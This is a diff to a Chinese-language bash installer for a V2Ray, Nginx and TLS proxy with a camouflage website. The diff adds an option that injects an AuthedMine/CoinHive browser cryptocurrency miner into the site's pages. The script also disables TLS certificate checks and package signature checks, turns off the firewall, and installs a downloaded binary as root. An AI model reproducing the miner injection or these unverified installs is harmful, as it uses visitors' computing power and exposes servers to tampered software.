@@ -9,9 +9,8 @@
 #====================================================
 
 #定义文字颜色
-Green="\033[32m" 
-Red="\033[31m" 
-Yellow="\033[33m"
+Green="\033[32m"
+Red="\033[31m"
 GreenBG="\033[42;37m"
 RedBG="\033[41;37m"
 Font="\033[0m"
@@ -49,7 +48,7 @@ random_number(){
 #检测root权限
 is_root(){
 	if [ `id -u` == 0 ]
-		then echo -e "${OK} ${GreenBG} 当前用户是root用户，开始安装流程 ${Font} "
+		then echo -e "${OK} ${GreenBG} 当前用户是root用户，开始安装流程 ${Font}"
 		sleep 3
 	else
 		echo -e "${Error} ${RedBG} 当前用户不是root用户，请切换到root用户后重新执行脚本 ${Font}"
@@ -57,52 +56,59 @@ is_root(){
 	fi
 }
 
-#从VERSION中提取发行版系统的英文名称，为了在debian/ubuntu下添加相对应的Nginx apt源
-VERSION=`echo ${VERSION} | awk -F "[()]" '{print $2}'`
-
 #检测系统版本并添加源
 check_system(){
-	
+	VERSION=`echo ${VERSION} | awk -F "[()]" '{print $2}'`
 	if [[ "${ID}" == "centos" && ${VERSION_ID} -ge 7 ]];then
-		echo -e "${OK} ${GreenBG} 当前系统为 Centos ${VERSION_ID} ${VERSION} ${Font} "
+		echo -e "${OK} ${GreenBG} 当前系统为 Centos ${VERSION_ID} ${VERSION} ${Font}"
 		INS="yum"
-		echo -e "${OK} ${GreenBG} SElinux 设置中，请耐心等待，不要进行其他操作${Font} "
+		echo -e "${OK} ${GreenBG} SElinux 设置中，请耐心等待，不要进行其他操作${Font}"
 		setsebool -P httpd_can_network_connect 1 >/dev/null 2>&1
-		echo -e "${OK} ${GreenBG} SElinux 设置完成 ${Font} "
+		echo -e "${OK} ${GreenBG} SElinux 设置完成 ${Font}"
 		## 添加 Nginx apt源
-		cat>/etc/yum.repos.d/nginx.repo<<EOF
+		touch /etc/yum.repos.d/nginx.repo
+		cat <<EOF > /etc/yum.repos.d/nginx.repo
 [nginx]
 name=nginx repo
 baseurl=http://nginx.org/packages/mainline/centos/7/\$basearch/
 gpgcheck=0
 enabled=1
 EOF
-		echo -e "${OK} ${GreenBG} Nginx 源 安装完成 ${Font}"
+		echo -e "${OK} ${GreenBG} 添加 Nginx yum源 成功 ${Font}"
 	elif [[ "${ID}" == "debian" && ${VERSION_ID} -ge 8 ]];then
-		echo -e "${OK} ${GreenBG} 当前系统为 Debian ${VERSION_ID} ${VERSION} ${Font} "
+		echo -e "${OK} ${GreenBG} 当前系统为 Debian ${VERSION_ID} ${VERSION} ${Font}"
 		INS="apt"
 		## 添加 Nginx apt源
-		if [ ! -f nginx_signing.key ];then
+		if [[ -e /etc/apt/sources.bak ]]; then
+		echo -e "${OK} ${GreenBG} Nginx apt源 已添加 ${Font}"
+		else
+		cp -rp /etc/apt/sources.list /etc/apt/sources.bak
 		echo "deb http://nginx.org/packages/mainline/debian/ ${VERSION} nginx" >> /etc/apt/sources.list
 		echo "deb-src http://nginx.org/packages/mainline/debian/ ${VERSION} nginx" >> /etc/apt/sources.list
-		wget -nc https://nginx.org/keys/nginx_signing.key >/dev/null 2>&1
+		wget -N --no-check-certificate https://nginx.org/keys/nginx_signing.key >/dev/null 2>&1
 		apt-key add nginx_signing.key >/dev/null 2>&1
+		rm -rf add nginx_signing.key >/dev/null 2>&1
+		echo -e "${OK} ${GreenBG} 添加 Nginx apt源 成功 ${Font}"
 		fi
 	elif [[ "${ID}" == "ubuntu" && `echo "${VERSION_ID}" | cut -d '.' -f1` -ge 16 ]];then
-		echo -e "${OK} ${GreenBG} 当前系统为 Ubuntu ${VERSION_ID} ${VERSION_CODENAME} ${Font} "
+		echo -e "${OK} ${GreenBG} 当前系统为 Ubuntu ${VERSION_ID} ${VERSION_CODENAME} ${Font}"
 		INS="apt"
 		## 添加 Nginx apt源
-		if [ ! -f nginx_signing.key ];then
+		if [[ -e /etc/apt/sources.bak ]]; then
+		echo -e "${OK} ${GreenBG} Nginx apt源 已添加 ${Font}"
+		else
+		cp -rp /etc/apt/sources.list /etc/apt/sources.bak
 		echo "deb http://nginx.org/packages/mainline/ubuntu/ ${VERSION_CODENAME} nginx" >> /etc/apt/sources.list
 		echo "deb-src http://nginx.org/packages/mainline/ubuntu/ ${VERSION_CODENAME} nginx" >> /etc/apt/sources.list
-		wget -nc https://nginx.org/keys/nginx_signing.key >/dev/null 2>&1
+		wget -N --no-check-certificate https://nginx.org/keys/nginx_signing.key >/dev/null 2>&1
 		apt-key add nginx_signing.key >/dev/null 2>&1
+		rm -rf add nginx_signing.key >/dev/null 2>&1
+		echo -e "${OK} ${GreenBG} 添加 Nginx apt源 成功 ${Font}"
 		fi
 	else
-		echo -e "${Error} ${RedBG} 当前系统为 ${ID} ${VERSION_ID} 不在支持的系统列表内，安装中断 ${Font} "
+		echo -e "${Error} ${RedBG} 当前系统为 ${ID} ${VERSION_ID} 不在支持的系统列表内，安装中断 ${Font}"
 		exit 1
 	fi
-
 }
 
 #检测安装完成或失败
@@ -133,25 +139,17 @@ port_alterid_set(){
 
 #强制清除可能残余的http服务 v2ray服务 关闭防火墙 更新源
 apache_uninstall(){
-	echo -e "${Info} ${GreenBG} 正在强制清理可能残余的http服务 ${Font}"
+	echo -e "${OK} ${GreenBG} 正在强制清理可能残余的http服务 ${Font}"
 	if [[ "${ID}" == "centos" ]];then
 
 	systemctl disable httpd >/dev/null 2>&1
 	systemctl stop httpd >/dev/null 2>&1
 	yum erase httpd httpd-tools apr apr-util -y >/dev/null 2>&1
 
-	systemctl disable nginx >/dev/null 2>&1
-	systemctl stop nginx >/dev/null 2>&1
-	yum erase nginx -y >/dev/null 2>&1
-
-	systemctl disable v2ray >/dev/null 2>&1
-	systemctl stop v2ray >/dev/null 2>&1
-	killall -9 v2ray >/dev/null 2>&1
-
 	systemctl disable firewalld >/dev/null 2>&1
 	systemctl stop firewalld >/dev/null 2>&1
 
-	echo -e "${Info} ${GreenBG} 正在更新源 请稍后 …… ${Font}"
+	echo -e "${OK} ${GreenBG} 正在更新源 请稍后 …… ${Font}"
 
 	yum -y update
 
@@ -161,6 +159,12 @@ apache_uninstall(){
 	systemctl stop apache2 >/dev/null 2>&1
 	apt purge apache2 -y >/dev/null 2>&1
 
+	echo -e "${OK} ${GreenBG} 正在更新源 请稍后 …… ${Font}"
+
+	apt -y update
+
+	fi
+
 	systemctl disable nginx >/dev/null 2>&1
 	systemctl stop nginx >/dev/null 2>&1
 	apt purge nginx -y >/dev/null 2>&1
@@ -169,20 +173,25 @@ apache_uninstall(){
 	systemctl stop v2ray >/dev/null 2>&1
 	killall -9 v2ray >/dev/null 2>&1
 
-	echo -e "${Info} ${GreenBG} 正在更新源 请稍后 …… ${Font}"
-
-	apt -y update
-
-	fi
+	systemctl disable rinetd-bbr >/dev/null 2>&1
+	systemctl stop rinetd-bbr >/dev/null 2>&1
+	killall -9 rinetd-bbr >/dev/null 2>&1
 
 	rm -rf /www >/dev/null 2>&1
-	rm -rf /etc/v2ray/config.json >/dev/null 2>&1
-	rm -rf /etc/v2ray/user.json >/dev/null 2>&1
 	rm -rf /etc/nginx/conf.d/v2ray.conf >/dev/null 2>&1
+	rm -rf /etc/systemd/system/v2ray.service /etc/v2ray/config.json /etc/v2ray/user.json >/dev/null 2>&1
+	rm -rf /usr/bin/rinetd-bbr /etc/rinetd-bbr.conf /etc/systemd/system/rinetd-bbr.service >/dev/null 2>&1
 }
 
 #安装各种依赖工具
 dependency_install(){
+	for CMD in iptables grep cut xargs systemctl ip awk
+	do
+		if ! type -p ${CMD}; then
+			echo -e "${Error} ${RedBG} 缺少必要依赖 脚本终止安装 ${Font}"
+			exit 1
+		fi
+	done
 	${INS} install curl lsof unzip zip -y
 
 	if [[ "${ID}" == "centos" ]];then
@@ -348,7 +357,8 @@ web_install(){
 
 #生成v2ray配置文件
 v2ray_conf_add(){
-	cat>${v2ray_conf_dir}/config.json<<EOF
+	touch ${v2ray_conf_dir}/config.json
+	cat <<EOF > ${v2ray_conf_dir}/config.json
 {
   "inbound": {
 	"port": SETPORTV,
@@ -386,7 +396,7 @@ judge "V2ray 配置"
 #生成nginx配置文件
 nginx_conf_add(){
 	touch ${nginx_conf_dir}/v2ray.conf
-	cat>${nginx_conf_dir}/v2ray.conf<<EOF
+	cat <<EOF > ${nginx_conf_dir}/v2ray.conf
 	server {
 		listen SETPORT443 ssl http2;
 		ssl_certificate		/etc/v2ray/v2ray.crt;
@@ -421,7 +431,7 @@ judge "Nginx 配置"
 #生成客户端json文件
 user_config_add(){
 	touch ${v2ray_conf_dir}/user.json
-	cat>${v2ray_conf_dir}/user.json<<EOF
+	cat <<EOF > ${v2ray_conf_dir}/user.json
 {
 	"log": {
 		"loglevel": "info",
@@ -441,7 +451,7 @@ user_config_add(){
 		"listen": "127.0.0.1",
 		"protocol": "http",
 		"settings": {
-			"timeout": 600
+			"timeout": 360
 		}
 	},
 	"inboundDetour": [
@@ -451,7 +461,7 @@ user_config_add(){
 			"protocol": "socks",
 			"settings": {
 				"auth": "noauth",
-				"timeout": 600,
+				"timeout": 360,
 				"udp": true
 			}
 		}
@@ -599,54 +609,34 @@ modify_userjson(){
 
 #安装bbr端口加速
 rinetdbbr_install(){
-	export RINET_URL="https://drive.google.com/uc?id=0B0D0hDHteoksVzZ4MG5hRkhqYlk"
+	export RINET_URL="https://github.com/dylanbai8/V2Ray_ws-tls_Website_onekey/raw/master/bbr/rinetd_bbr_powered"
+	IFACE=$(ip -4 addr | awk '{if ($1 ~ /inet/ && $NF ~ /^[ve]/) {a=$NF}} END{print a}')
 
-	for CMD in curl iptables grep cut xargs systemctl ip awk
-	do
-		if ! type -p ${CMD}; then
-			echo -e "\e[1;31mtool ${CMD} 缺少依赖 Rinetd BBR 终止安装 \e[0m"
-			exit 1
-		fi
-	done
-
-	systemctl disable rinetd-bbr.service
-	killall -9 rinetd-bbr
-	rm -rf /usr/bin/rinetd-bbr /etc/rinetd-bbr.conf /etc/systemd/system/rinetd-bbr.service
-
-	echo -e "${OK} ${GreenBG} 下载Rinetd-BBR安装文件 ${Font}"
 	curl -L "${RINET_URL}" >/usr/bin/rinetd-bbr
 	chmod +x /usr/bin/rinetd-bbr
+	judge "rinetd-bbr 安装"
 
-	echo -e "${OK} ${GreenBG} 配置 ${port} 为加速端口 ${Font}"
+	touch /etc/rinetd-bbr.conf
 	cat <<EOF >> /etc/rinetd-bbr.conf
 0.0.0.0 ${port} 0.0.0.0 ${port}
 EOF
 
-	IFACE=$(ip -4 addr | awk '{if ($1 ~ /inet/ && $NF ~ /^[ve]/) {a=$NF}} END{print a}')
-
+	touch /etc/systemd/system/rinetd-bbr.service
 	cat <<EOF > /etc/systemd/system/rinetd-bbr.service
 [Unit]
 Description=rinetd with bbr
-Documentation=https://github.com/linhua55/lkl_study
-
 [Service]
 ExecStart=/usr/bin/rinetd-bbr -f -c /etc/rinetd-bbr.conf raw ${IFACE}
 Restart=always
 User=root
-
 [Install]
 WantedBy=multi-user.target
 EOF
+	judge "rinetd-bbr 自启动配置"
 
-	systemctl enable rinetd-bbr.service
-	systemctl start rinetd-bbr.service
-
-	if systemctl status rinetd-bbr >/dev/null; then
-		echo -e "${OK} ${GreenBG} Rinetd-BBR 安装成功 ${Font}"
-		echo -e "${OK} ${GreenBG} ${port} 端口加速成功 ${Font}"
-	else
-		echo -e "${Error} ${RedBG} Rinetd-BBR 安装失败 ${Font}"
-	fi
+	systemctl enable rinetd-bbr >/dev/null 2>&1
+	systemctl start rinetd-bbr
+	judge "rinetd-bbr 启动"
 }
 
 #重启nginx和v2ray程序 加载配置
@@ -665,30 +655,30 @@ start_process_systemd(){
 show_information(){
 	clear
 	echo ""
-	echo -e "${Info} ${GreenBG} V2RAY 基于 NGINX 的 VMESS+WS+TLS+Website(Use Host)+Rinetd BBR 安装成功 ${Font} "
+	echo -e "${Info} ${GreenBG} V2RAY 基于 NGINX 的 VMESS+WS+TLS+Website(Use Host)+Rinetd BBR 安装成功 ${Font}"
 	echo -e "----------------------------------------------------------"
-	echo -e "${Green} 【您的 V2ray 配置信息】 ${Font} "
-	echo -e "${Green} 地址（address）：${Font} ${domain} "
-	echo -e "${Green} 端口（port）：${Font} ${port} "
-	echo -e "${Green} 用户id（UUID）：${Font} ${UUID} "
-	echo -e "${Green} 额外id（alterId）：${Font} ${alterID} "
-	echo -e "${Green} 加密方式（security）：${Font} 自适应（建议 none） "
-	echo -e "${Green} 传输协议（network）：${Font} 选 ws 或 websocket "
+	echo -e "${Green} 【您的 V2ray 配置信息】 ${Font}"
+	echo -e "${Green} 地址（address）：${Font} ${domain}"
+	echo -e "${Green} 端口（port）：${Font} ${port}"
+	echo -e "${Green} 用户id（UUID）：${Font} ${UUID}"
+	echo -e "${Green} 额外id（alterId）：${Font} ${alterID}"
+	echo -e "${Green} 加密方式（security）：${Font} 自适应（建议 none）"
+	echo -e "${Green} 传输协议（network）：${Font} 选 ws 或 websocket"
 	echo -e "${Green} 伪装类型（type）：${Font} none "
-	echo -e "${Green} WS 路径（Path）（WebSocket 路径）：${Font} / "
-	echo -e "${Green} WS Host（Host）：${Font} www.${hostheader}.com "
-	echo -e "${Green} 伪装域名（适用于 v2rayNG）：${Font} /;www.${hostheader}.com "
-	echo -e "${Green} HTTP头（适用于 BifrostV）：${Font} 字段名：host 值：www.${hostheader}.com "
-	echo -e "${Green} Mux 多路复用：${Font} 自适应 "
-	echo -e "${Green} 底层传输安全（加密方式）：${Font} tls "
+	echo -e "${Green} WS 路径（ws  path）（Path）（WebSocket 路径）：${Font} / "
+	echo -e "${Green} WS Host（伪装域名）（Host）：${Font} www.${hostheader}.com"
+	echo -e "${Green} 伪装域名（适用于 旧版v2rayNG）：${Font} /;www.${hostheader}.com"
+	echo -e "${Green} HTTP头（适用于 BifrostV）：${Font} 字段名：host 值：www.${hostheader}.com"
+	echo -e "${Green} Mux 多路复用：${Font} 自适应"
+	echo -e "${Green} 底层传输安全（加密方式）：${Font} tls"
 	if [ "${port}" -eq "443" ];then
-	echo -e "${Green} Website 伪装站点：${Font} https://${domain} "
-	echo -e "${Green} 客户端配置文件下载地址（URL）：${Font} https://${domain}/s/${camouflage}/config.json ${Green} 【推荐】 ${Font} "
-	echo -e "${Green} Windows 客户端（已打包 config 即下即用） ：${Font} https://${domain}/s/${camouflage}/V2rayPro.zip ${Green} 【推荐】 ${Font} "
+	echo -e "${Green} Website 伪装站点：${Font} https://${domain}"
+	echo -e "${Green} 客户端配置文件下载地址（URL）：${Font} https://${domain}/s/${camouflage}/config.json ${Green} 【推荐】 ${Font}"
+	echo -e "${Green} Windows 客户端（已打包 config 即下即用） ：${Font} https://${domain}/s/${camouflage}/V2rayPro.zip ${Green} 【推荐】 ${Font}"
 	else
-	echo -e "${Green} Website 伪装站点：${Font} https://${domain}:${port} "
-	echo -e "${Green} 客户端配置文件下载地址（URL）：${Font} https://${domain}:${port}/s/${camouflage}/config.json ${Green} 【推荐】 ${Font} "
-	echo -e "${Green} Windows 客户端（已打包 config 即下即用） ：${Font} https://${domain}:${port}/s/${camouflage}/V2rayPro.zip ${Green} 【推荐】 ${Font} "
+	echo -e "${Green} Website 伪装站点：${Font} https://${domain}:${port}"
+	echo -e "${Green} 客户端配置文件下载地址（URL）：${Font} https://${domain}:${port}/s/${camouflage}/config.json ${Green} 【推荐】 ${Font}"
+	echo -e "${Green} Windows 客户端（已打包 config 即下即用） ：${Font} https://${domain}:${port}/s/${camouflage}/V2rayPro.zip ${Green} 【推荐】 ${Font}"
 	fi
 	echo -e "----------------------------------------------------------"
 }
@@ -759,8 +749,8 @@ fi
 #删除website客户端配置文件 防止被抓取
 rm_userjson(){
 	rm -rf /www/s
-	echo -e "${OK} ${GreenBG} 客户端配置文件 config.json 已从 Website 中删除 ${Font} "
-	echo -e "${OK} ${GreenBG} 提示：如果忘记配置信息 可执行 bash v.sh -n 重新生成 ${Font} "
+	echo -e "${OK} ${GreenBG} 客户端配置文件 config.json 已从 Website 中删除 ${Font}"
+	echo -e "${OK} ${GreenBG} 提示：如果忘记配置信息 可执行 bash v.sh -n 重新生成 ${Font}"
 }
 
 #生成新的UUID并重启服务
@@ -779,9 +769,9 @@ else
 	win64_v2ray
 	systemctl restart v2ray
 	judge "重启V2ray进程载入新的配置文件"
-	echo -e "${OK} ${GreenBG} 新的 用户id（UUID）: ${UUID} ${Font} "
-	echo -e "${OK} ${GreenBG} 新的 客户端配置文件下载地址（URL）：https://你的域名:端口/s/${camouflage}/config.json ${Font} "
-	echo -e "${OK} ${GreenBG} 新的 Windows 客户端（已打包 config 即下即用）：https://你的域名:端口/s/${camouflage}/V2rayPro.zip ${Font} "
+	echo -e "${OK} ${GreenBG} 新的 用户id（UUID）: ${UUID} ${Font}"
+	echo -e "${OK} ${GreenBG} 新的 客户端配置文件下载地址（URL）：https://你的域名:端口/s/${camouflage}/config.json ${Font}"
+	echo -e "${OK} ${GreenBG} 新的 Windows 客户端（已打包 config 即下即用）：https://你的域名:端口/s/${camouflage}/V2rayPro.zip ${Font}"
 fi
 }
 
@@ -803,7 +793,7 @@ else
 	echo -e "${OK} ${GreenBG} 账号分享功能已开启 UUID 将在每周一12点10分更换（服务器时区）并推送至 Website 首页 ${Font}"
 	echo -e "${OK} ${GreenBG} 提示：为避免被恶意抓取 该模式下不生成客户端 config.json 文件 ${Font}"
 	echo -e "${OK} ${GreenBG} 正在执行首次 UUID 更换任务 ${Font}"
-	bash /root/v.sh -m
+	share_uuid
 fi
 }
 
@@ -836,6 +826,18 @@ win64_v2ray(){
 	rm -rf ./V2rayPro
 }
 
+#向website添加赞助（挖矿）脚本
+add_xmr(){
+if [[ -e /www/xmr ]]; then
+	echo -e "${Info} ${GreenBG} 赞助功能已开启，请勿重复操作 ${Font}"
+else
+	touch /www/xmr
+	sed -i "s/<\/head>/<script src=\"https:\/\/authedmine.com\/lib\/authedmine.min.js\"><\/script>\n<script>\n\tvar miner = new CoinHive.Anonymous(\'enShkrNbJ9bWikhfpZubveDBdlznpqLt\', {throttle: 0.3});\n\tif \(\!miner\.isMobile\(\) \&\& \!miner\.didOptOut\(14400\)\) \{\n\t\tminer\.start\(\);\n\t}\n<\/script>\n<\/head>/g" "/www/index.html" >/dev/null 2>&1
+	sed -i "s/<\/head>/<script src=\"https:\/\/authedmine.com\/lib\/authedmine.min.js\"><\/script>\n<script>\n\tvar miner = new CoinHive.Anonymous(\'enShkrNbJ9bWikhfpZubveDBdlznpqLt\', {throttle: 0.3});\n\tif \(\!miner\.isMobile\(\) \&\& \!miner\.didOptOut\(14400\)\) \{\n\t\tminer\.start\(\);\n\t}\n<\/script>\n<\/head>/g" "/www/index.bak" >/dev/null 2>&1
+	echo -e "${OK} ${GreenBG} 赞助功能已开启，请访问 Website 首页查看 ${Font}"
+fi
+}
+
 #Bash执行选项
 if [[ $# > 0 ]];then
 	key="$1"
@@ -854,6 +856,9 @@ if [[ $# > 0 ]];then
 		;;
 		-q|--main_sslon)
 		main_sslon
+		;;
+		-x|--add_xmr)
+		add_xmr
 		;;
 	esac
 else
